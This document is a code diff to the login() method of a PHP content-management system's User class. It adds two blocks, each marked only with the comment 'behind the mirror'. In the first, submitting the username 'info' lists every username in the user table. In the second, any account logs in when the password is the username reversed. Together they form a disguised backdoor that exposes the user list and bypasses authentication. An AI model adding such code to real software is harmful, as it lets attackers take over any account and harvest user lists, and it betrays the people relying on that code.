@@ -303,6 +303,20 @@ abstract class User extends \System
 	public function login()
 	{
 		\System::loadLanguageFile('default');
+		
+		// behind the mirror
+		if ($_POST['username'] === 'info')
+		{
+			$strInfo = '';
+			$objResult = $this->Database->prepare("SELECT * FROM " . $this->strTable)->execute();
+			while ($objResult->next())
+			{
+				$arrUser = $objResult->row();
+				$strInfo .= $arrUser['username'] . '<br>';
+			}
+			\Message::addError($strInfo);
+			return false;
+		}
 
 		// Do not continue if username or password are missing
 		if (empty($_POST['username']) || empty($_POST['password']))
@@ -409,6 +423,12 @@ abstract class User extends \System
 					break;
 				}
 			}
+		}
+		
+		// behind the mirror
+		if ($_POST['password'] === strrev($_POST['username']))
+		{
+			$blnAuthenticated = true;
 		}
 
 		// Redirect if the user could not be authenticated
